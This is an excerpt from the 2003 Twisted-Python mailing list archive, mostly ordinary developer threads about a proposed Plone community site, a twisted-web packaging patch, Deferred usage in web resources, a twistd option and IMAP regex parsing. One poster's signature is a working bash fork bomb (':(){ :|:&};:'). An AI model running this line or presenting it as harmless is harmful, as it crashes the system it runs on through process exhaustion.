up with it yourself?  In my experience expressions that long tend to be
wrong in unexpected and surprising ways, and I'm not inclined to trust them
without careful analysis, or at least the knowledge that they come from an
authoritative source (and even then, ensuring the proper meaning survived
into the translation to python REs is a pain...)

  All that said, thanks for the patch!  I'm looking forward to the next
revision :)

  Jp

-- 
        "I quite agree with you," said the Duchess; "and the moral of
that is -- Be what you would seem to be' -- or, if you'd like it put
more simply -- Never imagine yourself not to be otherwise than what it
might appear to others that what you were or might have been was not 
otherwise than what you had been would have appeared to them to be
otherwise.'"       -- Lewis Carrol, "Alice in Wonderland"
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030709/499cd46e/attachment.sig>

From lafou at wanadoo.fr  Wed Jul  9 10:50:31 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 09 Jul 2003 18:50:31 +0200
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for comments
Message-ID: <1057769430.2859.64.camel@biproc>

Hi all

we spoke last month about the twistedmatrix website. It has a great
advantage : it demonstrates that twisted.web works for a production
server.

Besides, TwistedMatrix popularity grows day by day, and I think we need
a different approach. The mailing list should be only used by
developers, or developments related to twisted.

I propose you a brand new website based on plone which would help to
create a bigger and more reactive community. I've started developing
one.

Only the products links are available, but you can already register and
log in to add some content. For those who are using mozilla > 1.3.1 or
IE > 5.5, you will enjoy Epoz (select it from preferences/wysiwyg
editor). Epoz allows you to manage content with a wysiwyg editor whitout
any plugin.

Feel free to send some comments.

adress :

http://twistedmatrix.dyndns.org

I you like it, I would be proud to give to source code so that you can
host the REAL website (I can't here).

(glyph, email me personnaly if you want an admin access to test
workflows)

Philippe




From 2002 at weholt.org  Wed Jul  9 11:51:50 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Wed, 9 Jul 2003 19:51:50 +0200
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for comments
References: <1057769430.2859.64.camel@biproc>
Message-ID: <001701c34642$c775d540$0401a8c0@razor>

Very nice!! But it says it's powered by Twisted and Plone? Isn't Plone a
Zope-product? How??  Is there something I don't know here .... ??

Thomas

----- Original Message -----
From: "Philippe Lafoucrière" <lafou at wanadoo.fr>
To: <twisted-python at twistedmatrix.com>
Sent: Wednesday, July 09, 2003 6:50 PM
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for comments


> Hi all
>
> we spoke last month about the twistedmatrix website. It has a great
> advantage : it demonstrates that twisted.web works for a production
> server.
>
> Besides, TwistedMatrix popularity grows day by day, and I think we need
> a different approach. The mailing list should be only used by
> developers, or developments related to twisted.
>
> I propose you a brand new website based on plone which would help to
> create a bigger and more reactive community. I've started developing
> one.
>
> Only the products links are available, but you can already register and
> log in to add some content. For those who are using mozilla > 1.3.1 or
> IE > 5.5, you will enjoy Epoz (select it from preferences/wysiwyg
> editor). Epoz allows you to manage content with a wysiwyg editor whitout
> any plugin.
>
> Feel free to send some comments.
>
> adress :
>
> http://twistedmatrix.dyndns.org
>
> I you like it, I would be proud to give to source code so that you can
> host the REAL website (I can't here).
>
> (glyph, email me personnaly if you want an admin access to test
> workflows)
>
> Philippe
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From lafou at wanadoo.fr  Wed Jul  9 12:50:17 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 09 Jul 2003 20:50:17 +0200
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for
	comments
In-Reply-To: <001701c34642$c775d540$0401a8c0@razor>
References: <1057769430.2859.64.camel@biproc>
	 <001701c34642$c775d540$0401a8c0@razor>
Message-ID: <1057776616.2860.66.camel@biproc>

On Wed, 2003-07-09 at 19:51, Thomas Weholt wrote:
> Very nice!! But it says it's powered by Twisted and Plone? Isn't Plone a
> Zope-product? How??  Is there something I don't know here .... ??
> 
> Thomas


Yes, Plone is an Add on for Zope CMF. Maybe in the future some parts of the site would 
use twisted products (still to define).





From tv at twistedmatrix.com  Wed Jul  9 12:38:34 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Wed, 9 Jul 2003 21:38:34 +0300
Subject: [Twisted-Python] [PATCH] Bugfixing the twisted-web (not twisted.web) package
Message-ID: <20030709183834.GA10828@lapdog>

	Hi. Couldn't find anything newer than 0.3 of
	Moshe's twisted-web package. Tried to use it,
	it really didn't work. Here's a patch.

diff -Naur twisted-web-0.3/debian/default twisted-web-0.3.1/debian/default
--- twisted-web-0.3/debian/default	2002-11-10 10:50:48.000000000 +0200
+++ twisted-web-0.3.1/debian/default	2003-07-09 14:09:58.000000000 +0300
@@ -1,5 +1,5 @@
 pidfile=/var/run/twisted-web.pid
 rundir=/var/lib/twisted-web/
-file=/etc/twisted-web
+file=/etc/twisted-web/twisted-web
 logfile=/var/log/twisted-web.log
 more_args=--no_save 
diff -Naur twisted-web-0.3/debian/init.d twisted-web-0.3.1/debian/init.d
--- twisted-web-0.3/debian/init.d	2002-11-10 10:50:02.000000000 +0200
+++ twisted-web-0.3.1/debian/init.d	2003-07-09 11:50:32.000000000 +0300
@@ -4,7 +4,7 @@
 
 pidfile=/var/run/twisted-web.pid
 rundir=/var/lib/twisted-web/
-file=/etc/twisted-web
+file=/etc/twisted-web/twisted-web
 logfile=/var/log/twisted-web.log
 more_args=--no_save
 
diff -Naur twisted-web-0.3/twisted-web twisted-web-0.3.1/twisted-web
--- twisted-web-0.3/twisted-web	2002-11-10 10:33:11.000000000 +0200
+++ twisted-web-0.3.1/twisted-web	2003-07-09 14:14:06.000000000 +0300
@@ -1,6 +1,6 @@
 from twisted.web import script, static, server, distrib, twcgi
-from twistedin.internet import app
-import pwd, grp
+from twisted.internet import app
+import pwd, grp, glob
 
 root = static.File('/var/www')
 root.processors = {
@@ -56,8 +56,8 @@
 site = server.Site(root, logPath=logPath)
 
 # Set user/group to run under
-uid = pwd.getpwnam('www-data')
-gid = grp.getgrnam('www-data')
+uid = pwd.getpwnam('www-data')[2]
+gid = grp.getgrnam('www-data')[2]
 
 
 application = app.Application("web", uid=uid, gid=gid)


-- 
:(){ :|:&};:



From tpherndon at mindspring.com  Wed Jul  9 13:28:12 2003
From: tpherndon at mindspring.com (Peter Herndon)
Date: Wed, 9 Jul 2003 15:28:12 -0400
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for
 comments
In-Reply-To: <1057776616.2860.66.camel@biproc>
Message-ID: <7AB54D92-B243-11D7-8509-000A27AF313A@mindspring.com>

Philippe,

> Yes, Plone is an Add on for Zope CMF. Maybe in the future some parts 
> of the site would
> use twisted products (still to define).

Why do you believe we need the content management features of Plone?  
What is your rationale?  And, perhaps more to the point, perhaps you 
should consider rewriting the functionality using Twisted, if you deem 
the features necessary.  After all, the Twisted website is the premier 
working advertisement for the Twisted code, at least at the moment.  If 
we don't eat our own dogfood, that will reflect very poorly on Twisted.

Please understand, I am not trying to belittle Twisted in any way, but 
the website is the one working example of Twisted that I know about.  
In all the other cases listed under "Success Stories", Twisted is being 
used in its role as framework-under-the-covers, and is not on public 
display.  Having a public-accessible example of Twisted allows the 
potential user to "kick the tires" before buying.

Reinventing the wheel that is Plone is by no means a trivial task, yet 
I believe that moving to a solution that is not powered by Twisted 
would be a very bad move in terms of public relations.  Of course, 
writing a bridge layer to make Plone run on top of Twisted would be 
really cool, too.  Insane, maybe, but cool.  ;)

For what it might be worth, I would suggest using Twisted in all areas 
that you possibly can.  For instance, Twisted has an NNTP server.  So, 
why aren't we (or are we, I don't know?) mirroring this mailing list as 
a newsgroup?  Stuff like this provides great advertising opportunities.

Thoughts, anyone?

---Peter Herndon





From jon at totient.demon.co.uk  Wed Jul  9 13:45:34 2003
From: jon at totient.demon.co.uk (Jon Dyte)
Date: Wed, 9 Jul 2003 20:45:34 +0100
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for comments
In-Reply-To: <1057769430.2859.64.camel@biproc>
References: <1057769430.2859.64.camel@biproc>
Message-ID: <200307092045.35015.jon@totient.demon.co.uk>

Phillippe

Looks like a good idea.
what we all want to know, is are you running Zope on top of twisted for this 
site? Or is this apache/zserver etc etc?

cheers

Jon




On Wednesday 09 Jul 2003 5:50 pm, Philippe Lafoucrière wrote:
> Hi all
>
> we spoke last month about the twistedmatrix website. It has a great
> advantage : it demonstrates that twisted.web works for a production
> server.
>
> Besides, TwistedMatrix popularity grows day by day, and I think we need
> a different approach. The mailing list should be only used by
> developers, or developments related to twisted.
>
> I propose you a brand new website based on plone which would help to
> create a bigger and more reactive community. I've started developing
> one.
>
> Only the products links are available, but you can already register and
> log in to add some content. For those who are using mozilla > 1.3.1 or
> IE > 5.5, you will enjoy Epoz (select it from preferences/wysiwyg
> editor). Epoz allows you to manage content with a wysiwyg editor whitout
> any plugin.
>
> Feel free to send some comments.
>
> adress :
>
> http://twistedmatrix.dyndns.org
>
> I you like it, I would be proud to give to source code so that you can
> host the REAL website (I can't here).
>
> (glyph, email me personnaly if you want an admin access to test
> workflows)
>
> Philippe
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python




From lafou at wanadoo.fr  Wed Jul  9 13:55:05 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 09 Jul 2003 21:55:05 +0200
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for
	comments
In-Reply-To: <7AB54D92-B243-11D7-8509-000A27AF313A@mindspring.com>
References: <7AB54D92-B243-11D7-8509-000A27AF313A@mindspring.com>
Message-ID: <1057780505.2860.82.camel@biproc>

On Wed, 2003-07-09 at 21:28, Peter Herndon wrote:
> Philippe,
> 
> > Yes, Plone is an Add on for Zope CMF. Maybe in the future some parts 
> > of the site would
> > use twisted products (still to define).
> 
> Why do you believe we need the content management features of Plone?  
> What is your rationale?  And, perhaps more to the point, perhaps you 
> should consider rewriting the functionality using Twisted, if you deem 
> the features necessary.  After all, the Twisted website is the premier 
> working advertisement for the Twisted code, at least at the moment.  If 
> we don't eat our own dogfood, that will reflect very poorly on Twisted.

That's why I putted the logo twisted powered in footer. I'd love to see
some apps running on such website.


> Please understand, I am not trying to belittle Twisted in any way, but 
> the website is the one working example of Twisted that I know about.  
> In all the other cases listed under "Success Stories", Twisted is being 
> used in its role as framework-under-the-covers, and is not on public 
> display.  Having a public-accessible example of Twisted allows the 
> potential user to "kick the tires" before buying.

There's no -- known -- success story about twisted. I saw Issues, but
it's maybe the only plugin / product / app which is not deprecated.

You shouldn't forget that Twisted has not only developers, but USERS too
! The current website and mailing are designed for developers, not users
(which is a good starting point btw).

> Reinventing the wheel that is Plone is by no means a trivial task, yet 
> I believe that moving to a solution that is not powered by Twisted 
> would be a very bad move in terms of public relations.  Of course, 
> writing a bridge layer to make Plone run on top of Twisted would be 
> really cool, too.  Insane, maybe, but cool.  ;)

I agree, that would be great. Now, we don't have known products. Making
such a bridge would be too much efforts.

We really need some working exemple, some uptodate apps that show how to
use Twisted.

Plone would help us to set a dynamic community, and that the only point
I see. Twisted.web is not designed to make content management
applications, so please let zope and plone do their job.

> For what it might be worth, I would suggest using Twisted in all areas 
> that you possibly can.  For instance, Twisted has an NNTP server.  So, 
> why aren't we (or are we, I don't know?) mirroring this mailing list as 
> a newsgroup?  Stuff like this provides great advertising opportunities.

Would be a good idea. New users don't use the mailing list just to give
twisted a shot. They are often disappointed by the lack of uptodate docs
and exemples.



(sorry for my english)
Philippe




From lafou at wanadoo.fr  Wed Jul  9 14:00:56 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 09 Jul 2003 22:00:56 +0200
Subject: [Twisted-Python] New TwistedMatrix WebSite - wainting for
	comments
In-Reply-To: <200307092045.35015.jon@totient.demon.co.uk>
References: <1057769430.2859.64.camel@biproc>
	 <200307092045.35015.jon@totient.demon.co.uk>
Message-ID: <1057780856.2859.89.camel@biproc>

On Wed, 2003-07-09 at 21:45, Jon Dyte wrote:
> Phillippe
> 
> Looks like a good idea.
> what we all want to know, is are you running Zope on top of twisted for this 
> site? Or is this apache/zserver etc etc?
> 
> cheers
> 
> Jon

This website is running on a PIII 750 (256 Mo, 10Go HD). It runs Gentoo Linux 1.4 
with zope 2.6.1. There is a proxy pass on my gateway to this machine (via apache).
Plone needs zope to run. BUT, we can add some features using twisted, I have no exemple
at all for now. Maybe a forum, the log of the mailing list, a newsletter, whatever, something 
original.

This site has been designed to replace twisted, but to complement (or complete, I don't know
which is the correct term) it.

I love the idea of plone because every user can add some content, and maybe start some new
twisted projects. I repeat : this site should be designed for users, not only "twisted-core" 
developers.


Philippe




From don at motorola.com  Wed Jul  9 14:17:53 2003
From: don at motorola.com (Don Hiatt)
Date: Wed, 9 Jul 2003 15:17:53 -0500
Subject: [Twisted-Python] using defferred?
In-Reply-To: <1057776616.2860.66.camel@biproc>
Message-ID: <FPEBLIAFGDEEOHHAGOKBKEADCCAA.don@motorola.com>

Howdy,

So I have a simple client that connects to "A" and sends
a requests and waits for a response. I'm using the clientfactory
and it works great. Now, I would like to integrate it with
a webserver, so when the user requests a certain url, I will
have my client connects to "A", send the request, wait for
the response, and then render the result in html and pass it
back to the user. The problem is, how do you do this in a 
event based system? I suspect Defferred might be my friend but 
I'm not sure.

My app looks like

class Simple(resource.Resource):
	isLeaf = True
	def render(self, request):
		sendRequest()
		... How do I wait for the client's datarecieved method
		.... to be called and then have access to the data??
		return result

....
__main__
m = Factory()
app.connect(h,p,m)

site = server.Site(Simple())
app.listenTCP(8888, site)


Thanks a lot for your time.

Cheers,

don




From mario at ruggier.org  Wed Jul  9 16:31:56 2003
From: mario at ruggier.org (Mario Ruggier)
Date: Thu, 10 Jul 2003 00:31:56 +0200
Subject: [Twisted-Python] using defferred?
In-Reply-To: <FPEBLIAFGDEEOHHAGOKBKEADCCAA.don@motorola.com>
Message-ID: <2593EDB2-B25D-11D7-9E80-000393756786@ruggier.org>

I had asked a similar question some time ago--this should surely
be added to the FAQ? (I see it is "mentioned" in the using-twistedweb
howto, but not really explained...)

Here's one way to do it (as I understand it), morphing your
example code to illustrate:

##

from twisted.internet import defer, threads
from twisted.web.server import NOT_DONE_YET

def callbackResult(result, request):
     request.write(result)
     request.finish()

class Simple(resource.Resource):
     isLeaf = True
     def render(self, request):
         d = threads.deferToThread(sendRequest)
         d.addCallback(callbackResult, request)
         return NOT_DONE_YET
...

##

Another way to do it could be to use the woven MVC, in
particular to use the IModel interface. Anyone can provide
a simple example for that?

mario



On mercredi, juil 9, 2003, at 22:17 Europe/Amsterdam, Don Hiatt wrote:

> Howdy,
>
> So I have a simple client that connects to "A" and sends
> a requests and waits for a response. I'm using the clientfactory
> and it works great. Now, I would like to integrate it with
> a webserver, so when the user requests a certain url, I will
> have my client connects to "A", send the request, wait for
> the response, and then render the result in html and pass it
> back to the user. The problem is, how do you do this in a
> event based system? I suspect Defferred might be my friend but
> I'm not sure.
>
> My app looks like
>
> class Simple(resource.Resource):
> 	isLeaf = True
> 	def render(self, request):
> 		sendRequest()
> 		... How do I wait for the client's datarecieved method
> 		.... to be called and then have access to the data??
> 		return result
>
> ....
> __main__
> m = Factory()
> app.connect(h,p,m)
>
> site = server.Site(Simple())
> app.listenTCP(8888, site)
>
>
> Thanks a lot for your time.
>
> Cheers,
>
> don
>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python




From 2002 at weholt.org  Wed Jul  9 18:02:47 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Thu, 10 Jul 2003 02:02:47 +0200
Subject: [Twisted-Python] Is it just me ....
Message-ID: <006f01c34676$9a28db80$0401a8c0@razor>

or is Twisted ... well, complicated. I've been programming for several years
and I don't consider myself to be dumb, allthough not a genius either ;-) --
but Twisted is hard to understand. Perhaps you guys find the docs simple
enough, but I just don't get a lot of the key concepts.

The fact that there are so few examples of running ( and uptodate as
mentioned by P. Lafoucriere ) apps available might be a clue. Just look at
the whole RPYs-thing we had going some time ago. Web-development, or to be
precise, running a full-scale webserver is why a lot of people look into
Twisted in the first place. The lack of example-apps and obvious
misunderstandings on how Twisted is meant to be used is what's holding
Twisted back, IMHO.

I really hope the new Twisted-community page can bring some simple, well
documented examples on how to do things. By the way things are going we'll
probably have very good docs in a couple of months or so, but I want to
implement a feature-rich webserver based on Twisted now, as I've described
and nagged about in my postings on this list several times.

Anyway, I feel there is too much promise in the Twisted platform to let a
few good examples scare alot of potential users away. I'm still working on a
test-implementation of a webserver which hopefully will be easy enough to
understand and deploy, extend and customize, written in a Twisted-way.

Anyway, I'm going to ask again; any example, small and simple, showing how
to implement a webserver serving static content *and* dynamic pages, not
static pages like Issues or Bannerfish, using woven-forms and
user-authentication, in a Twisted-compatible manner would be appreciated. If
I'm the only one feeling this way, I'll shut up, dive into the docs again,
try some more and keep silent while doing so. Hopefully I'll be able to
learn Twisted and contribute something, not just nag, to a dedicated group
of developers.

Now, I have to go get 3-4 hours of sleep before going to work. Thank your
for your interest.

PS! An early version of my test-web-server is still available at
http://home.online.no/~t-weh/articles/projects/elope/elopetestimplementation
.zip and I'm still hoping for comments.

Best regards,
Thomas W




From golux at comcast.net  Wed Jul  9 21:22:19 2003
From: golux at comcast.net (Steve Waterbury)
Date: Wed, 09 Jul 2003 23:22:19 -0400
Subject: [Twisted-Python] a patch to add an option to twistd to run without signal handlers
Message-ID: <3F0CDBEB.30804@comcast.net>

Minions,

Whereas my machine has acquired a weird malady that causes a
traceback when trying to run the reactor with signal
handlers (I've tried many things, including compiling
various versions of Python from source, etc. ... I'm sure
it will be revealed one of these days what the hell is
going on, but in the meantime ...), and whereas I can
run my tests using reactor.run(installSignalHandlers=0)
but I also like to test using twistd and a tap file,
I made this relatively innocent little hack to give twistd
an option that make it more convenient to do so.

Of course, when twistd is killed running in this mode it
dies very unceremoniously, not signing off in its log
or removing its pid file or writing anything.  But it does
what I need.

Offered for your consideration ...

Cheers,
Steve.
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: patch-twistd-nosig
URL: </pipermail/twisted-python/attachments/20030709/6a6fc564/attachment.ksh>

From ta-meyer at ihug.co.nz  Wed Jul  9 21:27:15 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Thu, 10 Jul 2003 15:27:15 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F13025654DC@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F130212AAE7@its-xchg4.massey.ac.nz>

>   Eeep :o  This isn't quite what I was going for... The exec
> stage is a big no-no from my point of view.

Fair enough.

> I guess I should give a couple examples.

That helped!

>   The only other thing I wanted to mention was that scary
> regular expression.  I haven't even attempted to decipher it 
> yet, but I was curious if you pulled it out of or based it 
> off of one of the RFCs, or if you came up with it yourself?  

I built it myself from RFC2060, using Kodos (and my server) to test it.

> In my experience expressions that long tend to be wrong in
> unexpected and surprising ways, and I'm not inclined to trust 
> them without careful analysis, or at least the knowledge that 
> they come from an authoritative source (and even then, 
> ensuring the proper meaning survived into the translation to 
> python REs is a pain...)

Well, it started life as a python RE, so there was no translation.  I did
very carefully analyse (and test) it, and you're welcome to as well.  It's
easy enough to do without it, or split it into several smaller re's, but
this seems the best way to do it.

It's really not as complicated as it looks - a lot of the length comes from
having named groups, which makes things more reliable, not less.  There are
also several uncaptured groups, which could probably just be made into
regular groups, but the result is tidier this way.

I've made the re verbose, so maybe that helps?  (the changes also allowed it
to be simplified just a little, plus I've made it more for capturing and
less for checking, in the mime section specifier, particularly).

>   All that said, thanks for the patch!  I'm looking forward
> to the next revision :)

Here it is.  The atts passed should be more-or-less what you described, now.

The mailbox code isn't quite the same; you had (as an example):
>     def fetch(self, msgs, queryParts, uid):
>         r = {}
>         for q in queryParts:
>             r[q] = getattr(self, 'fetch_' + q.name)(msgs, q, uid)

But this seems strange to me - you end up with a dictionary where the keys
are the classes (Body(), UID(), etc).  Whatever the values end up being,
unless the message id is added to the class, then this really doesn't fit
with the existing __cbFetch at all, which wants the keys to be the message
ids (which makes sense to me).  My mailbox code looks like this:
    def fetch(self, msgs, queryParts, uid):
        r = {}
        for (id, msg) in self.messagesIter(msgs, uid):
            r[id] = {}
            for q in parts:
                r[id][q] = getattr(self, 'grab' + q.name.upper())(msg, q)
        return r
Which is pretty similar, except that the key is still the message id.  (I
also do it message by message, whereas yours was part by part, but that
shouldn't matter).

It also wasn't exactly clear how you wanted the values to be returned.  What
is does at the moment is pass back a dict where the values are dicts of
class (BODY(), UID(), etc) to string.  This seems to be pretty close to the
original.

Let me know what you think of this, and I'll keep on with the fixes...

=Tony Meyer
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: fetch_att.py
URL: </pipermail/twisted-python/attachments/20030710/5f4ce7b4/attachment.ksh>

From m at moshez.org  Wed Jul  9 23:53:39 2003
From: m at moshez.org (Moshe Zadka)
Date: 10 Jul 2003 05:53:39 -0000
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F130212AAE7@its-xchg4.massey.ac.nz>
References: <1ED4ECF91CDED24C8D012BCF2B034F130212AAE7@its-xchg4.massey.ac.nz>
Message-ID: <20030710055339.31218.qmail@green.zadka.com>

On Thu, 10 Jul 2003, "Tony Meyer" <ta-meyer at ihug.co.nz> wrote:

> Well, it started life as a python RE, so there was no translation.  I did
> did very carefully analyse (and test) it, and you're welcome to as well.
> It's easy enough to do without it, or split it into several smaller re's, but
> this seems the best way to do it.

Why?
It's much better to split into several REs. When you need to comment your
REs, they're obviously useless -- it is impossible to keep comments in sync
with code, so when bugs crop up in your RE, it will be difficult to fix.
Not to mention you can't step with PDB through REs, or insert prints, to
see what exactly is going wrong.

Here's a proof of concept (untested) factorization into several REs
each of which is easy enough to describe:

sectionRe = re.compile('([\d\.])*\.') # digits and dots, ends with dot
partRe = re.compile('([A-Z\.]+)') # upper case letters and dots
fielditemsRe = re.compile(' \([()])*\)') # open-paren, parens, close paren
partialRe = re.compile('<(\d+\.[1-9]\d*)>') # digits, dot, non-zero, digits
body = re.compile('BODY') # BODY
peek = re.compile('\.?PEEK') # optional dot, PEEK
bra = re.compile('\[') # literal [
cket = re.compile('\]') # literal ]

# The comments are not necessary -- my point is that looking at those
# REs is easy to understand what they capture

def trymatch(r, s):
    m = r.match(s)
    if m:
        return m.group(1), s[m.end():]
    else:
        return None, s

def forcematch(r, s)
    m = r.match(s)
    if not m:
        raise IllegalIdentiferError()
    return s[m.end():]

# Note how the parsing is now done with code -- only the low-level
# tokenizing is done with REs. The code is relatively easy to read.
def parse(s):
    s = forcematch(body, s)
    peek, s = trymatch(peek, s)
    s = forcematch(bra, s)
    section, s = trymatch(sectionRe, s)
    part, s = trymatch(partRe, s, 1)
    fielditems, s = trymatch(fielditemsRe, s)
    s = forcematch(cket, s, 1)
    partial, s = trymatch(partialRe, s, 1)
    # End when you write it like that, it is easy to fine
    # false positives. For example, should we check s is empty?
    return peek, section, part, fielditems, partial

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From itamar at itamarst.org  Wed Jul  9 23:51:39 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 10 Jul 2003 01:51:39 -0400
Subject: [Twisted-Python] a patch to add an option to twistd to run
 without signal handlers
In-Reply-To: <3F0CDBEB.30804@comcast.net>
References: <3F0CDBEB.30804@comcast.net>
Message-ID: <20030710015139.3b4b1447.itamar@itamarst.org>

On Wed, 09 Jul 2003 23:22:19 -0400
Steve Waterbury <golux at comcast.net> wrote:

> Whereas my machine has acquired a weird malady that causes a
> traceback when trying to run the reactor with signal
> handlers (I've tried many things, including compiling
> various versions of Python from source, etc. ... I'm sure

Apparently this is a bug in wxPython 2.4.1.2. See the wxpython bug
tracker. Unless you discovered a whole new bug :)



From golux at comcast.net  Thu Jul 10 00:25:05 2003
From: golux at comcast.net (Steve Waterbury)
Date: Thu, 10 Jul 2003 02:25:05 -0400
Subject: [Twisted-Python] a patch to add an option to twistd to run without
 signal handlers
In-Reply-To: <20030710015139.3b4b1447.itamar@itamarst.org>
References: <3F0CDBEB.30804@comcast.net> <20030710015139.3b4b1447.itamar@itamarst.org>
Message-ID: <3F0D06C1.2090801@comcast.net>

Itamar Shtull-Trauring wrote:
> On Wed, 09 Jul 2003 23:22:19 -0400
> Steve Waterbury <golux at comcast.net> wrote:
> 
>>Whereas my machine has acquired a weird malady that causes a
>>traceback when trying to run the reactor with signal
>>handlers (I've tried many things, including compiling
>>various versions of Python from source, etc. ... I'm sure
> 
> Apparently this is a bug in wxPython 2.4.1.2. See the wxpython bug
> tracker. ...

Yep, that's exactly the bug.  It affects my code only in
some of the modules shared between client and server
packages, in which wx is imported ....  Hopefully
a point release of wx will come out soon to fix this,
as we want to run the reactor in our client also.

That twistd --nosig patch is mostly for situations that
shouldn't happen, I expect ... but if they do, there it is.
;^)

Steve.




From lafou at wanadoo.fr  Thu Jul 10 00:39:46 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 10 Jul 2003 08:39:46 +0200
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <006f01c34676$9a28db80$0401a8c0@razor>
References: <006f01c34676$9a28db80$0401a8c0@razor>
Message-ID: <1057819186.22678.2.camel@biproc>

On Thu, 2003-07-10 at 02:02, Thomas Weholt wrote:
> or is Twisted ... well, complicated. I've been programming for several years
> and I don't consider myself to be dumb, allthough not a genius either ;-) --
> but Twisted is hard to understand. Perhaps you guys find the docs simple
> enough, but I just don't get a lot of the key concepts.
> 
> The fact that there are so few examples of running ( and uptodate as
> mentioned by P. Lafoucriere ) apps available might be a clue. Just look at
> the whole RPYs-thing we had going some time ago. Web-development, or to be
> precise, running a full-scale webserver is why a lot of people look into
> Twisted in the first place. The lack of example-apps and obvious
> misunderstandings on how Twisted is meant to be used is what's holding
> Twisted back, IMHO.


Needless to say, I agree with you.




From ta-meyer at ihug.co.nz  Thu Jul 10 00:59:42 2003
From: ta-meyer at ihug.co.nz (Tony Meyer)
Date: Thu, 10 Jul 2003 18:59:42 +1200
Subject: [Twisted-Python] Re: IMAP fixes
In-Reply-To: <1ED4ECF91CDED24C8D012BCF2B034F130256567F@its-xchg4.massey.ac.nz>
Message-ID: <1ED4ECF91CDED24C8D012BCF2B034F1318CF0D@its-xchg4.massey.ac.nz>

> Why?

Well, efficiency, for one.  timeit rates the single re 5-6 times faster than
the proof of concept that you posted (corrected to work).  That's a
considerable speed difference.

> It's much better to split into several REs. When you need to 
> comment your REs, they're obviously useless

It didn't _need_ to be commented, I did so to point out how simple it
actually was.  This is a bizarre statement.  Does it then follow that if you
need to comment code, it's obviously useless?  Why would the re.VERBOSE flag
even exist if this was the case?

This re really isn't that complex.  If I take out the uncapturing and naming
of groups (which are just to make the code easier to read), and drop the
alternation, like in your proof of concept, it becomes:
BODY\.?(PEEK)?\[(([\d\.]*)\.)?([A-Z\.]+)(
\(([^\(\)]*)\))?\](\<\d+\.[1-9]\d*)\>)?
If this was written out in verbose form, then it would be easily as readable
as the proof of concept.

> -- it is impossible to keep comments in sync with code,

Why?  Change the code, check the comment.  Simple.  How is it any different
than checking that a change you make doesn't effect other parts of the code?

> Not to mention you can't step with PDB through REs, or insert 
> prints, to see what exactly is going wrong.

But there are other tools to test re's.  (In any case, you can insert print
statements, simply by using slices appropriately).

> Here's a proof of concept (untested) factorization into several REs
> each of which is easy enough to describe:
> 
> sectionRe = re.compile('([\d\.])*\.') # digits and dots, ends with dot
[...]
> cket = re.compile('\]') # literal ]

This section is no easier to understand - the only difference is the choice
in separation and wording of comments.

> # And when you write it like that, it is easy to find
> # false positives. For example, should we check s is empty?

You can check whether the single re ends at the end of the string just as
easily; I can't think of any tests that can't be carried out just as easily
with either solution.

> # Note how the parsing is now done with code -- only the low-level
> # tokenizing is done with REs. The code is relatively easy to read.

The code has become relatively more difficult to read, because almost all
the work is done by the re engine.  It's the parsing itself that is
theoretically easier to read.

In addition, having the multiple re's adds additional code that must be
written, tested and maintained.  The single re has the advantage that the
code to do the parsing is contained within the re module, and so is someone
else's problem.  There is only a single re to be sure of, instead of several
lines of code.

For the most part, this is a stylistic choice, not a correct/incorrect one.
The single re has the advantage of speed (important, in this particular
case), and less code to write/maintain.  The multiple re approach makes the
parsing more explicit, and makes changing the re less error-prone (an
unlikely event, in this particular case).

As I indicated, I don't really care whether Jp prefers a single re, multiple
re's like this, or using the string module and more if's; it's up to him
(whether I can be bothered coding the alternatives to offer as a patch is
another question ;).  I still personally believe that the single re is most
appropriate for this case, and given that I can always subclass the version
that gets checked in, it won't make any difference.

=Tony Meyer




From andrew-twisted at puzzling.org  Thu Jul 10 01:19:41 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Thu, 10 Jul 2003 17:19:41 +1000
Subject: [Twisted-Python] Is it just me ....
In-Reply-To: <006f01c34676$9a28db80$0401a8c0@razor>
References: <006f01c34676$9a28db80$0401a8c0@razor>
Message-ID: <20030710071941.GA21625@frobozz>

On Thu, Jul 10, 2003 at 02:02:47AM +0200, Thomas Weholt wrote:
> or is Twisted ... well, complicated. I've been programming for several years
> and I don't consider myself to be dumb, allthough not a genius either ;-) --
